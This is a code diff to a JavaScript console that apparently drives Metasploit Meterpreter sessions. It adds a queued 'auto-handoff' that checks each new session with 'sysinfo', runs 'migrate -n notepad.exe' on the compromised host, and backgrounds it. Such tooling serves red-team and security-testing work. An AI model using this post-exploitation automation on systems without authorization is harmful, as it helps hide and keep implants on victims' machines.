@@ -14,7 +14,12 @@
     closing:         new Set(),  // sids being killed — hide until RPC confirms
     _prevSessionIds: [],
     handoffBannerSid: null,
+    _handoffQueue:   [],
+    _handoffRunning: false,
   };
+
+  const HANDOFF_STABILIZE_MS = 5000;
+  const HANDOFF_LAUNCH_TTL_MS = 300000;
 
   const SHORTCUTS = {
     meterpreter: [
@@ -154,46 +159,149 @@
     runCmdOnSession(sid, cmd, 20).then(d => _applyCmdResult(sid, cmd, d));
   }
 
-  function runAutoHandoff(sid) {
+  function _getLaunchContext() {
+    try {
+      const raw = sessionStorage.getItem('h3x_last_launch');
+      if (!raw) return null;
+      const ctx = JSON.parse(raw);
+      if (!ctx || !ctx.ts || Date.now() - ctx.ts > HANDOFF_LAUNCH_TTL_MS) return null;
+      return ctx;
+    } catch (_) {
+      return null;
+    }
+  }
+
+  function _waitForSessionStable(sid) {
+    return runCmdOnSession(sid, 'sysinfo', 12).then(d => {
+      if (d.session_dead || d.status !== 'ok') return false;
+      return true;
+    }).catch(() => false);
+  }
+
+  function _scheduleHandoff(sid) {
     sid = String(sid);
     if (SHELL_STATE.handoffDone[sid] || !isAutoHandoffEnabled()) return;
+    if (SHELL_STATE._handoffQueue.includes(sid)) return;
+    SHELL_STATE._handoffQueue.push(sid);
+    _drainHandoffQueue();
+  }
+
+  function _drainHandoffQueue() {
+    if (SHELL_STATE._handoffRunning || !SHELL_STATE._handoffQueue.length) return;
+    const sid = SHELL_STATE._handoffQueue.shift();
+    SHELL_STATE._handoffRunning = true;
+    runAutoHandoff(sid).finally(() => {
+      SHELL_STATE._handoffRunning = false;
+      _drainHandoffQueue();
+    });
+  }
+
+  function runAutoHandoff(sid) {
+    sid = String(sid);
+    if (SHELL_STATE.handoffDone[sid] === true || !isAutoHandoffEnabled()) {
+      return Promise.resolve();
+    }
     const s = SHELL_STATE.sessions.find(x => String(x.id) === sid);
     if (!s || _sessionStype(s) !== 'meterpreter') {
       SHELL_STATE.handoffDone[sid] = true;
-      return;
+      return Promise.resolve();
     }
-    SHELL_STATE.handoffDone[sid] = 'running';
-    selectSession(sid);
-    showHandoffBanner(sid);
-    appendBuffer(sid, '\n[auto-handoff] migrate → notepad.exe, then background...\n', 'meta');
-    renderTerm();
+    if (SHELL_STATE.handoffDone[sid] === 'running') return Promise.resolve();
 
-    runCmdOnSession(sid, 'migrate -n notepad.exe', 25)
-      .then(d => {
-        if (!_applyCmdResult(sid, 'migrate', d)) return null;
-        return runCmdOnSession(sid, 'background', 12);
-      })
-      .then(d => {
-        if (!d) return;
-        _applyCmdResult(sid, 'background', d);
-        appendBuffer(sid, '[auto-handoff] complete — session hardened\n', 'echo');
-        renderTerm();
-        SHELL_STATE.handoffDone[sid] = true;
-      })
-      .catch(() => {
-        appendBuffer(sid, '[auto-handoff] failed — use banner buttons manually\n', 'stderr');
-        renderTerm();
-        delete SHELL_STATE.handoffDone[sid];
-      });
+    SHELL_STATE.handoffDone[sid] = 'running';
+    const launchCtx = _getLaunchContext();
+    const skipMigrate = !!(launchCtx && launchCtx.auto_migrate !== false);
+
+    return new Promise(resolve => {
+      setTimeout(() => {
+        const still = SHELL_STATE.sessions.find(x => String(x.id) === sid);
+        if (!still || SHELL_STATE.closing.has(sid)) {
+          delete SHELL_STATE.handoffDone[sid];
+          resolve();
+          return;
+        }
+
+        selectSession(sid);
+        showHandoffBanner(sid);
+
+        _waitForSessionStable(sid).then(stable => {
+          if (!stable) {
+            appendBuffer(sid,
+              '[auto-handoff] session unstable or died — skipping handoff\n', 'stderr');
+            renderTerm();
+            delete SHELL_STATE.handoffDone[sid];
+            resolve();
+            return;
+          }
+
+          const msg = skipMigrate
+            ? '\n[auto-handoff] launch already migrated — backgrounding only...\n'
+            : '\n[auto-handoff] migrate → notepad.exe, then background...\n';
+          appendBuffer(sid, msg, 'meta');
+          renderTerm();
+
+          const migrateStep = skipMigrate
+            ? Promise.resolve({status: 'ok'})
+            : runCmdOnSession(sid, 'migrate -n notepad.exe', 25);
+
+          migrateStep
+            .then(d => {
+              if (!skipMigrate && !_applyCmdResult(sid, 'migrate', d)) return null;
+              if (skipMigrate) {
+                appendBuffer(sid,
+                  '[auto-handoff] migrate skipped (launch hardening active)\n', 'meta');
+                renderTerm();
+              }
+              return runCmdOnSession(sid, 'background', 12);
+            })
+            .then(d => {
+              if (!d) return;
+              _applyCmdResult(sid, 'background', d);
+              appendBuffer(sid, '[auto-handoff] complete — session hardened\n', 'echo');
+              renderTerm();
+              SHELL_STATE.handoffDone[sid] = true;
+            })
+            .catch(() => {
+              appendBuffer(sid,
+                '[auto-handoff] failed — use banner buttons manually\n', 'stderr');
+              renderTerm();
+              delete SHELL_STATE.handoffDone[sid];
+            })
+            .finally(() => resolve());
+        });
+      }, HANDOFF_STABILIZE_MS);
+    });
   }
 
   function _onNewSessions(fresh) {
-    for (const s of fresh) {
+    if (!fresh.length) return;
+
+    const meterFresh = fresh.filter(s => _sessionStype(s) === 'meterpreter');
+    const primary = meterFresh.length
+      ? meterFresh[meterFresh.length - 1]
+      : fresh[fresh.length - 1];
+    const primarySid = String(primary.id);
+
+    showHandoffBanner(primarySid);
+
+    for (const s of meterFresh) {
       const sid = String(s.id);
-      showHandoffBanner(sid);
-      if (isAutoHandoffEnabled() && _sessionStype(s) === 'meterpreter') {
-        runAutoHandoff(sid);
+      if (sid !== primarySid) {
+        SHELL_STATE.handoffDone[sid] = true;
+        appendBuffer(sid,
+          '[auto-handoff] duplicate session — handoff skipped (primary is [' +
+          primarySid + '])\n', 'meta');
       }
+    }
+
+    for (const s of fresh) {
+      if (_sessionStype(s) !== 'meterpreter') {
+        SHELL_STATE.handoffDone[String(s.id)] = true;
+      }
+    }
+
+    if (meterFresh.length && isAutoHandoffEnabled()) {
+      _scheduleHandoff(primarySid);
     }
   }
 
